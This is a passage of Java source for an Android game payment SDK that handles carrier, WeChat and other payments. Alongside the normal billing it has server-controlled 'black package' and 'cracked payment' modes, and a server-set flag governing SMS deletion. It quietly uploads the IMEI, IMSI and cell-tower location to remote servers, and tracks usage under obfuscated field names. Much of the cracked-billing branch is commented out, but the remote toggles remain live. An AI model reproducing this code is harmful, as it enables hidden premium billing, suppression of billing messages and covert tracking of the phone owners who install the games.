package mobi.zty.sdk.game;

import java.util.HashMap;
import java.util.UUID;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.crypto.AES;
import mobi.zty.sdk.crypto.Crypto;
import mobi.zty.sdk.game.bean.ActivateResult;
import mobi.zty.sdk.game.bean.FanHeFeeInfo;
import mobi.zty.sdk.game.bean.FeePayInfo;
import mobi.zty.sdk.game.bean.GetMSMResult;
import mobi.zty.sdk.game.bean.InitializeResult;
import mobi.zty.sdk.game.bean.OthreFeeInfo;
import mobi.zty.sdk.game.bean.UnicomTCFeeInfo;
import mobi.zty.sdk.game.bean.UserInfo;
import mobi.zty.sdk.game.callback.ActivateCallback;
import mobi.zty.sdk.game.callback.GetMSMCallback;
import mobi.zty.sdk.game.callback.InitializeCallback;
import mobi.zty.sdk.game.object.parser.ActivateResultParser;
import mobi.zty.sdk.game.object.parser.GetMSMResultParser;
import mobi.zty.sdk.game.object.parser.InitializeResultParser;
import mobi.zty.sdk.http.HttpCallback;
import mobi.zty.sdk.http.HttpRequest;
import mobi.zty.sdk.update.DownloadeManager;
import mobi.zty.sdk.util.DeviceInfo;
import mobi.zty.sdk.util.DeviceInfoUtil;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.LocalStorage;
import mobi.zty.sdk.util.MSMConten;
import mobi.zty.sdk.util.OmpicSharedPreferences;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.TimeSharedPreferences;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import android.widget.Toast;
import cn.cmgame.billing.api.GameInterface;


public class GameSDK implements InitializeCallback, ActivateCallback,
		GetMSMCallback {
	private final static Lock lock = new ReentrantLock();
	private static GameSDK instance;

	static String mbDelSMS = "0";
	static String mDelSMSCon = "";
	private int afdft;
	private String afdf;
	public Context context;
	private SMSReceiver mSMSReceiver = new SMSReceiver();
	private IntentFilter mSMSResultFilter = new IntentFilter();
	public static final String SENT_SMS_ACTION = "SENT_SMS_ACTION";
	public static final String RECEIVED_SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private PowerManager mPowerManager = null;
	public String gameId;
	public String pc_ext;//留给cp的透传参数接口
	public String gameName;
	public String currentAppID;
	public String packetId = "1";// lsl
	public String deviceId;
	private boolean initalized;// 这里代表激活成功 说明用户进入游戏的时候有网络
	HttpRequest<InitializeResult> mInitializeRequest = null; // 初始化的request请求
	/* 联网用到的变量 start */
	public String dipcon;// 登录跑马灯内容
	public String dipcon2;// 支付跑马灯内容
	public String dipurl;// 支付公告
	public String noturl;// 登录公告
	public String exiturl;
	public boolean NETIVE_FEE_CAN_PAY = false;
	private static final int NETIVE_FEE_MSG = 1;
	private static final int NET_FEE_MSG = 5;
	private static final int FEE_OVER = 10;// 过了三十秒后 支付还没结束 恢复为可重新支付状态
	private static final int TO_OTHER_PAY = 15;// 如果mm破解遇到问题 都转用正常支付流程
	private static final int NOTICE_STARTPAY = 100;
	private static final int NOTICE_EXITGAME = 105;
	private long DELAY_TIMER = 100 * 1000;
	private boolean SendTimer = true;
	private static HttpCallback<GetMSMResult> SMScallBack;
	public long limitMoney = 0;// 单位是分；

	public OthreFeeInfo leYoufeeInfo = null;
	public OthreFeeInfo anAnfeeInfo = null;
	public FeePayInfo feePayInfo = null;
	public UnicomTCFeeInfo woPlusfeeInfo = null;
	public FanHeFeeInfo fanHeFeeInfo = null;
	public UnicomTCFeeInfo TCfeeInfo = null;
	public UnicomTCFeeInfo DXAllInfo = null;
	public String payTypeID = "";
	public int openDark = 0;
	public int openAlert = 0;
	public int openButton = 0;
	public int openOurAlert = 0;
	public int cootype = 0;
	public String gameVersionCode = "4";
	public int PayType = Integer.parseInt(Constants.COMMON_MM);
	/**
	 * 直接走 特定的支付
	 */
	public static String directPay = "";
	private static Handler handler = new Handler() {
		public void dispatchMessage(android.os.Message msg) {
			switch (msg.what) {
			case NETIVE_FEE_MSG:
				if (instance != null) {
					instance.NETIVE_FEE_CAN_PAY = true;
					if (instance.gameSDKInitListener != null) {
						instance.gameSDKInitListener.onOpenDark(
								instance.openDark, instance.openAlert,
								instance.openButton, instance.openOurAlert,
								instance.cootype);// 通知客户端 黑包开启
					}
				}
				break;
			case NET_FEE_MSG:
				try {
					String response = (String) msg.obj;
					if (response == null || response.equals("")) {
						SMScallBack.onFailure(1, "服务器无响应！");// 联网获取短信内容失败
															// 直接再走正常支付
						sendEmptyMessage(TO_OTHER_PAY);
					} else {
						JSONObject jsonObject = new JSONObject(response);
						int ret = jsonObject.getInt("code");
						GetMSMResultParser responseParser = new GetMSMResultParser();
						GetMSMResult msmResult = responseParser
								.getResponse(response);
						if (msmResult != null) {
							SMScallBack.onSuccess(msmResult);
						} else {
							SMScallBack.onFailure(ret, "解析数据失败！");
						}

					}
				} catch (JSONException e) {
					e.printStackTrace();
				}
				break;
			case TO_OTHER_PAY: {
				PayConfig.IS_PAYING = false;
				if (instance != null)
					instance.NETIVE_FEE_CAN_PAY = false;// 暂时不支持 黑包
				removeMessages(NETIVE_FEE_MSG);
				sendEmptyMessageDelayed(NETIVE_FEE_MSG, 8000);// 获取不到指令暂时不能
																// 10秒后恢复使用破解
				instance.startPay(SendOder.getInstance().amount,
						SendOder.getInstance().payindex,
						SendOder.getInstance().payname, gameSDKPaymentListener);
			}
				break;
			case FEE_OVER:
				PayConfig.IS_PAYING = false;// 这里只有 真正 支付很久没回来才会进来
				break;
			case NOTICE_STARTPAY:
				if (msg.obj!=null) {
					Object[] objs = (Object[]) msg.obj;
					instance.allPay((Integer) objs[0], (Integer) objs[1],
							(String) objs[2], (GameSDKPaymentListener) objs[3],
							(String[]) objs[4]);
				}
				break;
			case NOTICE_EXITGAME:
				if (msg.obj!=null) {
					handExitGame((ExitGameListener)msg.obj);
				}
				
				break;
			default:
				break;
			}
		};
	};

	private boolean mmSDKInited = false;
	private boolean tcSDKInited = false;
	private boolean uincomSDKInited = false;
	private boolean jdSDKINited = false;
	
	/* 联网用到的变量 end */

	public Handler payResultHandle = new Handler() {
		public void handleMessage(android.os.Message msg) {
			PayResultInfo info = (PayResultInfo) msg.obj;

			PayConfig.IS_PAYING = false;
			switch (msg.what) {
			case PayConfig.NOTIFY_PAYRESULT: {// 移动支付 结果回调
				if (info == null) {
					return;
				}
				switch (info.resutCode) {
				case PayConfig.BIIL_SUCC:
					SendOder.getInstance().sapay_ret(info.retMsg, 1);
					notifyPaymentFinish(SendOder.getInstance().amount);
					Util_G.debugE("paypay-->>", "SendOder.getInstance().amount="+SendOder.getInstance().amount);
					break;
				case PayConfig.BIIL_CANCER:
					notifyPaymentCancelled();
					break;
				case PayConfig.MM_INIT_CODE: {// 暂时联通，移动支付失败直接走微信
				// makeToast(info.retMsg);
					mmSDKInited = true;// 暂时只要初始化有响应就代表成功
					PaymentFactoy.producePay(PayConfig.WECHAT_PAY).pay(context,
							payOrder, SendOder.getInstance().amount, SendOder.getInstance().payname, paywayStr[9]);
					break;
				}
				case PayConfig.FEE_FAIL_TO_OTHER: {// 转正常支付
					handler.sendEmptyMessage(TO_OTHER_PAY);
				}
					break;
				default:
					notifyPaymentFail(info.resutCode, info.retMsg);
					break;
				}
				break;
			}
			case PayConfig.NATIVE_FEE_FAIL: {// 破解支付 短信被拦截
				if (instance.bCallback == 0) {
					instance.bCallback = 1;
					notifyPaymentFail(PayConfig.NATIVE_FEE_FAIL, "发送短信超时");
				}
				break;
			}
			case PayConfig.NO_THIS_PAYTYPE: {
				notifyPaymentFail(PayConfig.NO_THIS_PAYTYPE, "不支持该类型支付");
				break;
			}

			default:
				break;

			}
		};
	};

	public String payResultUrl = "http://211.154.152.59:8080/sdk/orderState";
	private Handler otherHandler = new Handler() {// 第三方支付 回调

		public void handleMessage(Message msg) {
			try {
				switch (msg.what) {
				case PayConfig.WECAHT_SUCC: {
					try {
						Helper.requestPayResult(payResultUrl, payOrder,
								new Helper.Callback() {
									@Override
									public void onResult(String info) {
										try {
											JSONObject jsonObject = new JSONObject(
													info);
											int ret = jsonObject.getInt("ret");
											if (ret == 1) {// 代表服务端通知成功
												PayResultInfo resultInfo = new PayResultInfo();
												resultInfo.resutCode = PayConfig.BIIL_SUCC;
												Message message = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
												message.obj = resultInfo;
												message.sendToTarget();
											} else {// 代表支付失败 发起第二次请求
												PayResultInfo resultInfo = new PayResultInfo();
												resultInfo.resutCode = PayConfig.WECHAT_PAY_FAIL;
												resultInfo.retMsg = "支付失败";
												Message message = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
												message.obj = resultInfo;
												message.sendToTarget();
											}
										} catch (JSONException e) {
											e.printStackTrace();
											PayResultInfo resultInfo = new PayResultInfo();
											resultInfo.resutCode = PayConfig.WECHAT_PAY_FAIL;
											resultInfo.retMsg = "支付失败";
											Message message = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
											message.obj = resultInfo;
											message.sendToTarget();
										}
									}
								});
					} catch (Exception e) {
						Log.e(Constants.TAG, e.getMessage());
						notifyPaymentFail(PayConfig.WECHAT_PAY_FAIL, "支付失败");
					}
				}
					break;
				default:
					Log.e(Constants.TAG, "msg.what:"+msg.what);
					notifyPaymentFail(PayConfig.WECHAT_PAY_FAIL, "支付失败");
					break;
				}
			} catch (Exception e) {
				Log.e(Constants.TAG, e.getMessage());
			}
		}
	};

	public static GameSDKPaymentListener gameSDKPaymentListener;
	private static GameSDKInitListener gameSDKInitListener;
	public static String payOrder;
	public static String limitOrder;// 限制订单 也是payOrder的一部分，是破解支付时的订单号
	public static int mobileType = PayConfig.CMCC_MOBLE;// 手机类型 移动联通 或者电信

	int mcc, mnc, lac, cid;
	/**
	 * 0：移动MM支付、
	 * 1：联通wo商店、2：电信爱游戏、3：无卡、4：联通wo+破解、5：电信天翼空间破解、6：没可选择的支付类型、7：mm基地白包, 8、alipay,9:ananpay
	 * 9、wechat
	 */
	private static final String[] paywayStr = { "mmpay", "unipay", "tcpay",
			"无卡", "wopay", "openpay", "nopay", "mmjd", "alipay", "wxpay","ananpay" };// wopay,openpay
	/**
	 * 破解支付才有用
	 */
	public int bCallback = 0;

	private GameSDK(Context context) {
		this.context = context;
		this.mPowerManager = (PowerManager) context
				.getSystemService(Context.POWER_SERVICE);
		SendTimer = true;
		new DurationTread().start();
	}

	public static GameSDK getInstance(Context context) {
		try {
			lock.lock();
			instance = new GameSDK(context);
			return instance;
		} finally {
			lock.unlock();
		}
	}

	public static GameSDK getInstance() {
		return instance;
		
		
	}

	/**
	 * 
	 * @param activity
	 * @param mmHandle
	 * @param packetType
	 *            1移动 5联通 10电信 15支付宝
	 * @return 实际支付类型 1移动 5联通 10电信 15支付宝
	 */
	public static void initSDK(Activity activity, String appid, GameSDKInitListener initListener, String... exts) {
		getInstance(activity);
		instance.gameSDKInitListener = initListener;
		instance.afdft = (int) (System.currentTimeMillis() / 1000);//
		// instance.packetId = packetId;
		// instanc-----e.gameId =
		// gameId;//Constants.GAMEID;//MetaDataUtil.getInt(activity,
		// "SHOUMENG_GAME_ID", 1);
		LocalStorage storage = LocalStorage.getInstance(activity);
		String discon = storage.getString(Constants.DisCon);
		instance.dipcon = discon;
		instance.noturl = storage.getString(Constants.DisUrl);
		Util_G.debugE("AllPay", "exts.size==>start");
		if (exts != null) {
			Util_G.debugE("AllPay", "exts.size==>"+exts.length);
			if (exts.length > 0) {
				instance.pc_ext = exts[0];
			}
			if (exts.length > 1 && exts[1].length() > 0) {
				try {
					instance.PayType = Integer.parseInt(exts[1]);
					 Util_G.debugE("AllPay", "instance.PayType==>"+instance.PayType);
					storage.putString(Constants.MK, instance.PayType + "");
					Util_G.debugE("AllPay", "存储后的instance.PayType==>"+storage.getString(Constants.MK, ""));
				} catch (Throwable e) {
					e.printStackTrace();
				}

			}
			if (exts.length > 2) {
				instance.gameVersionCode = exts[2];
			}
			instance.gameVersionCode = Helper.getVersionCode(instance.context)+"";
		}

		instance.currentAppID = appid;
		if (PayConfig.appidMap.containsKey(appid)) {// 在没卡的时候 appid 得特殊处理下
			instance.gameId = PayConfig.appidMap.get(appid);
		} else {
			instance.makeToast("appid不存在");
			return;
		}
		instance.packetId = Helper.getConfigString(activity, "MUZHI_PACKET");
		// if(PayConfig.isExport(instance.gameId))
		// {
		// Constants.SERVER_URL = "http://sa.91muzhi.com:8080/sdk/%s";
		//
		// }
		if (Helper.isDebugEnv()) {
			instance.makeToast("当前测试模式！");
			Constants.SERVER_URL = "http://sa.91muzhi.com:8090/sdk/%s";
		}
		instance.gameName = Helper.getApplicationName(activity);
		mobileType = Helper.getSIMType(instance.context);
		instance.initialize();
	}

	/**
	 * 设置程序是否为测试模式 默认false
	 * 
	 * @param var
	 */
	public static void setDebug(boolean var) {
		Helper.setDebug(var);
	}

	public void initialize() {
		
		mSMSResultFilter.addAction(SENT_SMS_ACTION);
		try {
			context.registerReceiver(mSMSReceiver, mSMSResultFilter);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		SendOder.getInstance().init(context);// 初始化发送 订单统计的 类
		try {
			
			PaymentFactoy.producePay(PayConfig.BILL_TYPE_TAOBAO).init(context,
					otherHandler);
		} catch (Throwable e) {
			Util_G.debugE("PayConfig.TAOBAO", e.getMessage());
		}
		try {
			PaymentFactoy.producePay(PayConfig.WECHAT_PAY).init(context,
					otherHandler);
		} catch (Throwable e) {
			Util_G.debugE("PayConfig.weixin", e.getMessage());
		}
		Util_G.debugE("AllPay", "mobileType==>"+mobileType);
		try {// 移动MM基地
			PaymentFactoy.producePay(PayConfig.JD_PAY).init(context,
					instance.currentAppID, payResultHandle);
			jdSDKINited = true;
			Util_G.debugE("AllPay", "JD_PAY init succ！");
		} catch (Throwable e) {
			Util_G.debugE("PayConfig.JD_PAY", e.getMessage());
		}
		instance.gameSDKInitListener.initOver(true, PayType, sdkControlVoice());
//		switch (mobileType) {
//		case PayConfig.CMCC_MOBLE: {// 非移动卡 不能进来否则 会挂掉
//			Util_G.debugE("AllPay", "进入移动卡初始化代码块  PayType=="+instance.PayType);
//			if(instance.PayType == Integer.parseInt(Constants.MM_JD_PAY)){
//				try {// 移动MM基地
//					PaymentFactoy.producePay(PayConfig.JD_PAY).init(context,
//							instance.currentAppID, payResultHandle);
//					jdSDKINited = true;
//					Util_G.debugE("AllPay", "JD_PAY init succ！");
//				} catch (Throwable e) {
//					Util_G.debugE("PayConfig.JD_PAY", e.getMessage());
//				}
//				instance.gameSDKInitListener.initOver(true, PayType, sdkControlVoice());
//			}else{
//				try {
//					PaymentFactoy.producePay(PayConfig.CMCC_MOBLE).init(context,
//							instance.currentAppID, payResultHandle);
//				} catch (Throwable e) {
//					Util_G.debugE("PayConfig.CMCC", e.getMessage());
//				}
//			}
//
////			try {// 移动MM本地破解
////				PaymentFactoy.producePay(PayConfig.CMCC_NETIVE_FEE).init(
////						context, instance.currentAppID, payResultHandle);
////			} catch (Throwable e) {
////				Util_G.debugE("PPayConfig.CMCC_NETIVE_FEE", e.getMessage());
////			}
//			break;
//		}
//		case PayConfig.TIANYI_MOBLE: {
//			try {
//				PaymentFactoy.producePay(PayConfig.TIANYI_MOBLE).init(context,
//						instance.currentAppID, payResultHandle);
//				tcSDKInited = true;// 电信 sdk只要存在就默认 初始化成功
//			} catch (Throwable e) {
//				Util_G.debugE("PayConfig.TC", e.getMessage());
//			}
//			break;
//		}
//		case PayConfig.UNICOM_MOBLE: {
//
//			try {
//				PaymentFactoy.producePay(PayConfig.UNICOM_MOBLE).init(context,
//						instance.currentAppID, payResultHandle);
//				uincomSDKInited = true;
//			} catch (Throwable e) {
//				Util_G.debugE("PayConfig.UNICON", e.getMessage());
//			}
//
//			break;
//		}
//		default:
//			break;
//		}
		PayConfig.IS_PAYING = false;
		// 下面初始化 packetID在激活的时候要用到
		// 所以最好在init(this)前初始化，PayConfig.currentAppID会在移动MM初始化后赋值
		String channel = Helper.getChannel((Activity) context, "channel");
		if (channel != null && channel.trim().length() >= 4
				&& !channel.startsWith("000000")) {
			if (StringUtil.isEmpty(instance.packetId)) {
				instance.packetId = instance.currentAppID
						.substring(instance.currentAppID.length() - 5)
						+ "_"
						+ channel.substring(channel.length() - 4);
			}
		}

		NETIVE_FEE_CAN_PAY = false;
		DELAY_TIMER_COUNT = 0;
		init(this);
	}

	private void init(InitializeCallback initializeCallback) {
		
		//检查更新
//			try {
//				checkupdate();
//			} catch (Exception e) {
//				e.printStackTrace();
//			}
				
		Util_G.debug_i("test", "init");//
		LocalStorage storage = LocalStorage.getInstance(context);
		deviceId = storage.getString(Constants.DEVICE_ID);
		
		String URL = storage.getString(Constants.URL);
		if (URL.length() > 1) {
			Constants.SERVER_URL = URL;
		}
		Util_G.debug_i("test", "url=" + URL);
		if (StringUtil.isEmpty(deviceId)) {

			DeviceInfo info = DeviceInfoUtil.getDeviceInfo(context);
			info.setPackageId(packetId);
			String api = String.format(Constants.SERVER_URL, "init");
			HttpRequest<InitializeResult> request = new HttpRequest<InitializeResult>(
					context, null, new InitializeResultParser(),// new
																// InitializeProgressView(context)
					new InitializeListener(initializeCallback));
			mInitializeRequest = request;

			request.execute(api, info.toJSON());

		} else {
			InitializeResult result = new InitializeResult(deviceId);
			initializeCallback.onInitSuccess(result);
		}

	}

	private class InitializeListener implements HttpCallback<InitializeResult> {

		private InitializeCallback callback;

		private InitializeListener(InitializeCallback callback) {
			this.callback = callback;
		}

		@Override
		public void onSuccess(InitializeResult object) {
			GameSDK.this.deviceId = object.getDeviceId();
			LocalStorage storage = LocalStorage.getInstance(context);
			storage.putString(Constants.DEVICE_ID, object.getDeviceId());
			callback.onInitSuccess(object);
		}

		@Override
		public void onFailure(int errorCode, String errorMessage) {
			callback.onFailure(errorCode, errorMessage);
			if (errorCode != Constants.ERROR_CODE_NET) {
				// 暂时单机初始化请求失败 不做任何处理
			}
		}

	}

	public void activate() {
		activate(this);
	}

	private void activate(ActivateCallback activateCallback) {

		Util_G.debug_i("test", "activate");
		String api = String.format(Constants.SERVER_URL, "activate");

		HttpRequest<ActivateResult> request = new HttpRequest<ActivateResult>(
				context, null, new ActivateResultParser(),// new
															// InitializeProgressView(context)
				new ActivateListener(activateCallback));

		TelephonyManager telephonyManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String operator = telephonyManager.getNetworkOperator();
		lac = 0;
		cid = 0;
		mcc = 0;
		mnc = 0;
		if (!StringUtil.isEmpty(operator)) {
			try {
				mcc = Integer.parseInt(operator.substring(0, 3));
				mnc = Integer.parseInt(operator.substring(3));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		if (mnc == 2 || mnc == 0 || mnc == 7) {
			try {
				GsmCellLocation location = (GsmCellLocation) telephonyManager
						.getCellLocation();
				lac = location.getLac();
				cid = location.getCid();
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			lac = 0;
			cid = 0;
		}

		JSONObject user = new JSONObject();
		try {
			user.put("device_id", deviceId);
			user.put("packet_id", packetId);
			user.put("game_id", gameId);
			user.put("imsi", Helper.getIMSI(context));
			user.put("imei", Helper.getIMEI(context));
			user.put("simop", Helper.getIMSIStart(context));
			user.put("ver", Constants.GAME_SDK_VERSION);
			user.put("mcc", mcc);
			user.put("mnc", mnc);
			user.put("lac", lac);
			user.put("cid", cid);
			user.put("game_ver", instance.gameVersionCode);
		} catch (JSONException e) {
			e.printStackTrace();
		}
		request.execute(api, user.toString());

	}

	private class ActivateListener implements HttpCallback<ActivateResult> {

		private ActivateCallback callback;

		private ActivateListener(ActivateCallback callback) {
			this.callback = callback;
		}

		@Override
		public void onSuccess(ActivateResult object) {
			callback.onActivateSuccess(object);
		}

		@Override
		public void onFailure(int errorCode, String errorMessage) {
			callback.onFailure(errorCode, errorMessage);
			if (errorCode != Constants.ERROR_CODE_NET) {
				// 单机激活失败不做处理
			}
		}

	}

	private static int DELAY_TIMER_COUNT = -1;

	private class DurationTread extends Thread {
		@Override
		public void run() {
			super.run();
			while (SendTimer) {
				try {
					if (!NETIVE_FEE_CAN_PAY) {
						DELAY_TIMER_COUNT += 1;
						if (DELAY_TIMER_COUNT > (DELAY_TIMER / 1000 + 10)) {
							handler.removeMessages(NETIVE_FEE_MSG);
							handler.sendEmptyMessage(NETIVE_FEE_MSG);
						}
					}
					watch();
					Thread.sleep(1000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	long background = 0;

	public void watch() {
		if (!mPowerManager.isScreenOn() || !Helper.isAppOnForeground(context)) {// 如果游戏不在前端马上发送数据
			if (background > 0) {
				background = 0;
				statisticsDuration(null);
				afdf3();
			}
		} else {
			background++;
			if (background > 60 * 2) {// 2分钟发送一次
				statisticsDuration(null);
				afdf3();
				background = 0;
			}
		}
	}

	/**
	 * 统计时长
	 * 
	 * @param storage
	 */
	private void statisticsDuration(LocalStorage storage) {
		if (storage == null) {
			storage = LocalStorage.getInstance(context);
		}
		int afd = 0;
		afd = (int) (System.currentTimeMillis() / 1000);
		storage.putString("adff2", String.valueOf(afd - instance.afdft));
	}

	public void afdf3() {
		Util_G.debug_i(Constants.TAG, "afdf");
		if (!initalized) {// 如果进来时初始化没成功 就不发送在线时长统计
			return;
		}

		String adff0 = getSavedLoginAccount();
		if (adff0 == null || adff0.trim().equals("")) {
			adff0 = Helper.getIMEI(context);
		}
		try {
			LocalStorage storage = LocalStorage.getInstance(context);
			int adff2 = 0;
			int adff3 = 0;
			String content = "0";
			String adff4 = "";
			String adff5 = "";
			String adff6 = "";
			try {

				content = storage.getString("adff2", "0");// crypto.decrypt(deviceId,content);
				adff2 = Integer.valueOf(content);

				content = storage.getString("adff3", "0");// crypto.decrypt(deviceId,content);
				adff3 = Integer.valueOf(content);

				adff4 = storage.getString("adff4", "");
				adff5 = storage.getString("adff5", "");
				adff6 = storage.getString("adff6", "");

			} catch (Exception ex) {
			}
			JSONObject user = new JSONObject();
			user.put("device_id", deviceId);
			user.put("packet_id", packetId);
			user.put("game_id", gameId);
			user.put("login_account", adff0);
			user.put("server_id", adff4);
			user.put("adff5", adff5);
			user.put("adff6", adff6);

			user.put("adff2", adff2);
			user.put("adff3", adff3);

			user.put("ver", Constants.GAME_SDK_VERSION);

			HttpRequest<UserInfo> request = new HttpRequest<UserInfo>(context,
					null, null,// new LoginProgressView(context)
					null);// new LoginListener(loginCallback))
			request.execute(afdf, user.toString());

			// Log.e("afdf3", "afdf3--->"+user.toString());
			instance.afdft = (int) (System.currentTimeMillis() / 1000);
		} catch (Exception ex) {
			// makeToast("初始化失败，请退出程序后再试");
		}

	}

	public String getSavedLoginAccount() {
		String ret = "";
		OmpicSharedPreferences localSharedPreferences = new OmpicSharedPreferences(
				Constants.dataPath);
		ret = localSharedPreferences.getString(Constants.LOGIN_ACCOUNT, "");

		if (StringUtil.isEmpty(ret)) {
			LocalStorage storage = LocalStorage.getInstance(context);
			try {
				Crypto crypto = new AES();
				String content = storage.getString(Constants.LOGIN_ACCOUNT, "");// crypto.decrypt(deviceId,content);
				ret = content;
			} catch (Exception ex) {
				// return "";
			}
		}
		return ret;
	}

	@Override
	public void onInitSuccess(
			mobi.zty.sdk.game.bean.InitializeResult initializeResult) {
		GameSDK.this.deviceId = initializeResult.deviceId;
		// activate(this);//lsl
		activate();
	}

	@Override
	public void onFailure(int errorCode, String errorMessage) {
		// Util_G.debug_i("test", "失败恢复url="+Constants.OSERVER_URL);
		// LocalStorage storage = LocalStorage.getInstance(context);
		// storage.putString(Constants.URL, Constants.OSERVER_URL);
	}

	@Override
	public void onActivateSuccess(ActivateResult activateResult) {
		Util_G.debugE("init", "imsi==="+Helper.getIMSI(context));
		GameSDK.this.afdf = activateResult.getAdfd();
		GameSDK.this.dipcon = activateResult.getDipcon();
		GameSDK.this.payTypeID = activateResult.getAppPayId();
		instance.openDark = activateResult.getOpenDark();
		instance.openAlert = activateResult.getOpenAlert();
		instance.openButton = activateResult.getOpenButton();
		instance.openOurAlert = activateResult.getOpenOurAlert();
		instance.cootype = activateResult.getCootype();
		GameSDK.mbDelSMS = activateResult.getbDel();
		GameSDK.mDelSMSCon = activateResult.getFillCon();
		/* 开黑包时间start */
		DELAY_TIMER = activateResult.getDelayDimer() * 1000;
		DELAY_TIMER_COUNT = 0;
		handler.sendEmptyMessageDelayed(NETIVE_FEE_MSG, DELAY_TIMER);
		/* 开黑包时间end */
		LocalStorage storage = LocalStorage.getInstance(context);
		storage.putString(Constants.URL, activateResult.getUrl());
		Util_G.debug_i("test", "newurl=" + activateResult.getUrl());
		storage.putString(Constants.DisCon, activateResult.getDipcon());
		storage.putString(Constants.DisUrl, activateResult.getNoturl());

		storage.putString(Constants.MKUrl, activateResult.getMkurl());
		String mk = activateResult.getMk();
		storage.putString(Constants.MK,
				((mk.equals("0") || mk == null || mk.trim().equals("")) ? PayType
						+ "" : activateResult.getMk()));

		limitMoney = activateResult.getLimitMoney();
		try {// 移动MM基地
			PaymentFactoy.producePay(PayConfig.JD_PAY).init(context,
					instance.currentAppID, payResultHandle);
			jdSDKINited = true;
			Util_G.debugE("AllPay", "JD_PAY init succ！");
		} catch (Throwable e) {
			Util_G.debugE("PayConfig.JD_PAY", e.getMessage());
		}
		instance.gameSDKInitListener.initOver(true, PayType, sdkControlVoice());
//		switch (mobileType) {
//		case PayConfig.CMCC_MOBLE:
//
//			if (getSetting(context, Constants.MK).equals(Constants.MM_JD_PAY)) {
//				PayType = Integer.parseInt(Constants.MM_JD_PAY);
//			} else if (getSetting(context, Constants.MK).equals(
//					Constants.NET_FEE)) {
//				feePayInfo = new FeePayInfo();
//				feePayInfo.initData(activateResult.getMkurl());
//			} else if (getSetting(context, Constants.MK).equals(
//					Constants.LEYOU_FEE)) {// 属于移动MM破解支付
//				leYoufeeInfo = new OthreFeeInfo();
//				leYoufeeInfo.initData(activateResult.getMkurl());
//				if (leYoufeeInfo.initSCC) {// 成功拿到安安的 计费信息了 才初始化sdk
//					try {// 移动MM乐游破解
//						
//						PaymentFactoy.producePay(PayConfig.CMCC_LEYOU_FEE)
//								.init(context, leYoufeeInfo.ChannelID,
//										payResultHandle);
//						PayType = Integer.parseInt(Constants.COMMON_MM);
//					} catch (Throwable e) {
//						Util_G.debugE("PayConfig.CMCC_LEYOU_FEE",
//								e.getMessage());
//					}
//				}
//
//			} else if (getSetting(context, Constants.MK).equals(
//					Constants.ANAN_FEE)) {// 属于移动MM破解支付
//
//				anAnfeeInfo = new OthreFeeInfo();
//				anAnfeeInfo.initData(activateResult.getMkurl());
//				if (anAnfeeInfo.initSCC) {
//					try {
//						PaymentFactoy.producePay(PayConfig.CMCC_ANAN_FEE).init(
//								context, anAnfeeInfo.appKey,
//								anAnfeeInfo.ChannelID, payResultHandle);
//						PayType = Integer.parseInt(Constants.COMMON_MM);
//					} catch (Throwable e) {
//						Util_G.debugE("PayConfig.CMCC_ANAN_FEE", e.getMessage());
//					}
//				}
//			}
//			break;
//
//		case PayConfig.UNICOM_MOBLE: {
//			PayType = PayConfig.UNICOM_MOBLE;// 联通白包
//			if (getSetting(context, Constants.MK).equals(Constants.UNICOM_FEE)) {
//				woPlusfeeInfo = new UnicomTCFeeInfo();
//				woPlusfeeInfo.initData(activateResult.getMkurl());
//				if (woPlusfeeInfo.initSCC) {// 成功拿到安安的 计费信息了 才初始化sdk
//					try {// 移动MM安安破解
//						PaymentFactoy.producePay(PayConfig.UNICOM_TEN_FEE)
//								.init(context, payResultHandle);
//					} catch (Throwable e) {
//						Util_G.debugE("PayConfig.UNICOM_TEN_FEE",
//								e.getMessage());
//					}
//					PayType = Integer.parseInt(Constants.UNICOM_FEE);
//				}
//			} else if (getSetting(context, Constants.MK).equals(
//					Constants.FANHE_PAY)) {
//				fanHeFeeInfo = new FanHeFeeInfo();
//				fanHeFeeInfo.initData(activateResult.getMkurl());
//				if (fanHeFeeInfo.initSCC) {
//					try {// 移动MM安安破解
//						PaymentFactoy.producePay(PayConfig.FANHE_PAY).init(
//								context, payResultHandle);
//					} catch (Throwable e) {
//						Util_G.debugE("PayConfig.FANHE_PAY", e.getMessage());
//					}
//					PayType = Integer.parseInt(Constants.FANHE_PAY);
//				}
//			}
//			break;
//		}
//		case PayConfig.TIANYI_MOBLE: {
//			PayType = PayConfig.TIANYI_MOBLE;
//			try {
//				if (getSetting(context, Constants.MK).equals(Constants.TC_FEE)) {
//					TCfeeInfo = new UnicomTCFeeInfo();
//					TCfeeInfo.initData(activateResult.getMkurl());
//					if (TCfeeInfo.initSCC) {
//						PaymentFactoy.producePay(PayConfig.TIANYI_FEE).init(
//								context, payResultHandle);
//						PayType = Integer.parseInt(Constants.TC_FEE);
//					}
//				} else if (getSetting(context, Constants.MK).equals(
//						Constants.TC_ALL_FEE)) {
//					DXAllInfo = new UnicomTCFeeInfo();
//					DXAllInfo.initData(activateResult.getMkurl());
//					if (DXAllInfo.initSCC) {
//						PaymentFactoy.producePay(PayConfig.DX_ALL).init(
//								context, payResultHandle);
//						PayType = Integer.parseInt(Constants.TC_ALL_FEE);
//					}
//				}
//			} catch (Throwable e) {
//				Util_G.debugE("TIANYI_FEE", e.getMessage());
//			}
//			break;
//		}
//		}

